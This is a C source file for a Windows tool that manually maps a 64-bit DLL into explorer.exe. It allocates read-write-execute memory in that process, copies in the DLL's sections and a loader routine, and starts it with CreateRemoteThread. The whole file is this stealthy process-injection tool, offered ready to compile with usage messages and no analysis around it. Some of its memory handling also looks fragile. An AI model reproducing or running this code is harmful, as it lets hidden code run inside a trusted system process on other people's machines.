#include<stdio.h>
#include<windows.h>
#include<tlhelp32.h>
#include<string.h>
typedef struct _PE_INFO
{
	LPVOID base;
	BOOL Reloc;
	BOOL isDLL;
	LPVOID Get_Proc;
	LPVOID Load_DLL;
}PE_INFO , * PPE_INFO;


LPVOID Load_in_Memory(char * Filename)
{
	HANDLE f;
	LPVOID Rbase;
	DWORD Size;
	
	if((f=CreateFileA(Filename,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL))==INVALID_HANDLE_VALUE)
	{
		
		return NULL;
	}
	
	Size=GetFileSize(f,NULL);
	
	if((Rbase=VirtualAlloc(NULL,Size,MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE))==NULL)
	{
		CloseHandle(f);
		return NULL;
	}
	
	ReadFile(f,Rbase,Size,NULL,NULL);
	
	
	CloseHandle(f);
	return Rbase;
}



void AdjustPE(PPE_INFO pe)
{
	PIMAGE_NT_HEADERS nt;
	PIMAGE_IMPORT_DESCRIPTOR import;
	PIMAGE_THUNK_DATA Othunk,Fthunk;
	PIMAGE_TLS_DIRECTORY tls;
	PIMAGE_BASE_RELOCATION reloc;
	PIMAGE_TLS_CALLBACK * CallBack;
	LPVOID base;
	void *(*Get_Proc)(LPVOID ,LPSTR );
	void *(*Load_DLL)(LPSTR );
	BOOL (*DLL_Entry)(LPVOID hinstDLL,DWORD fdwReason,LPVOID lpvReserved);
	void (*EXE_Entry)();
	
	int i;ULONGLONG *p,var;
	
	Load_DLL=pe->Load_DLL;
	Get_Proc=pe->Get_Proc;
	base=pe->base;
	
	nt=(PIMAGE_NT_HEADERS)(base+((PIMAGE_DOS_HEADER)base)->e_lfanew);
	
	
	DLL_Entry=base+nt->OptionalHeader.AddressOfEntryPoint;
	EXE_Entry=base+nt->OptionalHeader.AddressOfEntryPoint;
	
	
	
	if(!pe->Reloc)
	goto Load_Import;
	
	Relocate_Base:
		if(nt->OptionalHeader.DataDirectory[5].VirtualAddress==0)
		goto Load_Import;
		var=(ULONGLONG)base-(ULONGLONG)nt->OptionalHeader.ImageBase;
		reloc=(PIMAGE_BASE_RELOCATION)(base+nt->OptionalHeader.DataDirectory[5].VirtualAddress);
		while(reloc->VirtualAddress)
		{
			LPVOID dest=(base+reloc->VirtualAddress);
			int entry=(reloc->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/2;
			PWORD Data=(PWORD)((LPVOID)reloc+sizeof(IMAGE_BASE_RELOCATION));
			for(i=0;i<entry;i++,Data++)
			{
				if(((*Data)>>12)==10)
				{
					p=(PULONGLONG)(dest+((*Data)&0xfff));
					*p+=var;
				}
			}
			reloc=((LPVOID)reloc+reloc->SizeOfBlock);
		}
	
		
		
		
		
	Load_Import:
		if(nt->OptionalHeader.DataDirectory[1].VirtualAddress==0)
		goto TLS_Callback;
		import=(PIMAGE_IMPORT_DESCRIPTOR)(base+nt->OptionalHeader.DataDirectory[1].VirtualAddress);
		while(import->Name)
		{
			LPVOID dll=(*Load_DLL)(base+import->Name);
			Othunk=(PIMAGE_THUNK_DATA)(base+import->OriginalFirstThunk);
			Fthunk=(PIMAGE_THUNK_DATA)(base+import->FirstThunk);
			if(import->OriginalFirstThunk==0)
			 Othunk=Fthunk;
			 
			while(Othunk->u1.AddressOfData)
			{
				if(Othunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)
				{
					*(ULONGLONG *)Fthunk=(ULONGLONG)(*Get_Proc)(dll,(char *)IMAGE_ORDINAL(Othunk->u1.Ordinal));
				}
				else
				{
					PIMAGE_IMPORT_BY_NAME fnm=(PIMAGE_IMPORT_BY_NAME)(base+Othunk->u1.AddressOfData);
					*(ULONGLONG *)Fthunk=(ULONGLONG)(*Get_Proc)(dll,fnm->Name);
				}
				Othunk++;Fthunk++;
				
			} 
			import++;
		}
		
		
	
	
	
	
	TLS_Callback:
		if(nt->OptionalHeader.DataDirectory[9].VirtualAddress==0)
		goto Execute_Entry;
		tls=(PIMAGE_TLS_DIRECTORY)(base+nt->OptionalHeader.DataDirectory[9].VirtualAddress);
		if(tls->AddressOfCallBacks==0)
		goto Execute_Entry;
		
		CallBack=(PIMAGE_TLS_CALLBACK *)(tls->AddressOfCallBacks);
		while(*CallBack)
		{
			(*CallBack)(base,1,NULL);
			CallBack++;
		}
		
	
	
	Execute_Entry:
		if(pe->isDLL)
		(*DLL_Entry)(base,1,NULL);
		else
		(*EXE_Entry)();
	
}


int main(int i,char **arg)
{
	LPVOID Rbase,Obase;
	HANDLE snap,proc,Adj;
	PROCESSENTRY32 ps;
	BOOL found=FALSE;
	PE_INFO pe;
	PIMAGE_NT_HEADERS nt;
	PIMAGE_SECTION_HEADER sec;
	
	
	if(i!=2)
	{
		printf("Usage: %s <Pe>",*arg);
		return 0;
	}
	
	
	
	ZeroMemory(&ps,sizeof(ps));
	ps.dwSize=sizeof(ps);
	
	//Finding explorer.exe for HOST
	
	printf("[*]Searching For \'explorer.exe\'");
	
	snap=CreateToolhelp32Snapshot(2,0);
	if(snap==INVALID_HANDLE_VALUE)
	{
		printf("[-]Failed To Take Process Snapshot\n");
		return 0;
	}
	
	if(!Process32First(snap,&ps))
	{
		printf("[-]No Process Found\n");
		return 0;
	}
	
	do
	{
		if(!strcmp(ps.szExeFile,"explorer.exe"))
		{
			found=TRUE;
			break;
		}
	}while(Process32Next(snap,&ps));
	
	CloseHandle(snap);
	
	if(!found)
	{
		printf("[-]Desired Process is Not Found\n");
		return 0;
	}
	
	printf("\n[+]Reading \'%s\'\n",*(arg+1));
	//Reading DLL into MEMORY 
	if((Rbase=Load_in_Memory(*(arg+1)))==NULL)
	{
		printf("[-]Failed TO Read DLL Into Memory");
		return 0;
	}
	
	
	if(((PIMAGE_DOS_HEADER)Rbase)->e_magic!=23117)
	{
		printf("[-]Invalid PE\n");
		VirtualFree(Rbase,0,MEM_RESERVE);
		return 0;
	}
	nt=(PIMAGE_NT_HEADERS)(Rbase+((PIMAGE_DOS_HEADER)Rbase)->e_lfanew);
	
	if(nt->OptionalHeader.Magic!=IMAGE_NT_OPTIONAL_HDR64_MAGIC)
	{
		printf("[-]This is not 64bit PE");VirtualFree(Rbase,0,MEM_RESERVE);
		return 0;
	}
	
	sec=(PIMAGE_SECTION_HEADER)((LPVOID)nt+24+nt->FileHeader.SizeOfOptionalHeader);
	
	printf("[+]Opening Process..\n");
	
	if((proc=OpenProcess(PROCESS_ALL_ACCESS,0,ps.th32ProcessID))==NULL)
	{
		printf("[-]Failed To Open Process\n");
		return 0;
	}
	
	pe.Reloc=0;
	
	printf("[+]Allocating Memory Into Remote Process\n");
	
	if(((Obase=VirtualAllocEx(proc,(LPVOID)nt->OptionalHeader.ImageBase,nt->OptionalHeader.SizeOfImage,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE)))==NULL)
	{
		pe.Reloc=1;
		if(((Obase=VirtualAllocEx(proc,NULL,nt->OptionalHeader.SizeOfImage,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE)))==NULL)
		{
			printf("[-]Failed To Allocate Memory");VirtualFree(Rbase,0,MEM_RESERVE);
			return 0;
			
		}
	}
	
	//Coping Headers
	WriteProcessMemory(proc,Obase,Rbase,nt->OptionalHeader.SizeOfHeaders,NULL);
	for(i=0;i<nt->FileHeader.NumberOfSections;i++)
	{
		WriteProcessMemory(proc,Obase+sec->VirtualAddress,Rbase+sec->PointerToRawData,sec->SizeOfRawData,NULL);
		sec++;
	}
	
	
	VirtualFree(Rbase,0,MEM_RESERVE);
	
	Adj=VirtualAllocEx(proc,NULL,((ULONGLONG)main-(ULONGLONG)AdjustPE)+sizeof(pe),MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
	if(!Adj)
	{
		printf("[-]Failed To Allocate Memory For AdjustMent\n");
		VirtualFreeEx(proc,Obase,0,MEM_RESERVE);
		
	}
	
	pe.base=Obase;
	pe.Get_Proc=GetProcAddress;
	pe.Load_DLL=LoadLibraryA;
	pe.isDLL=1;
	
	WriteProcessMemory(proc,Adj,&pe,sizeof(pe),0);
	WriteProcessMemory(proc,Adj+sizeof(pe),AdjustPE,((ULONGLONG)main-(ULONGLONG)AdjustPE),NULL);
	if(NULL==CreateRemoteThread(proc,NULL,0,(LPTHREAD_START_ROUTINE)(Adj+sizeof(pe)),Adj,0,0))
	{
		printf("[-]CreateRemoteThread() Failed\n");
		VirtualFreeEx(proc,Obase,0,MEM_RESERVE);
	}
	else
	printf("[+]Adjusting PE and Executing....");
	CloseHandle(proc);
	return 0;
}
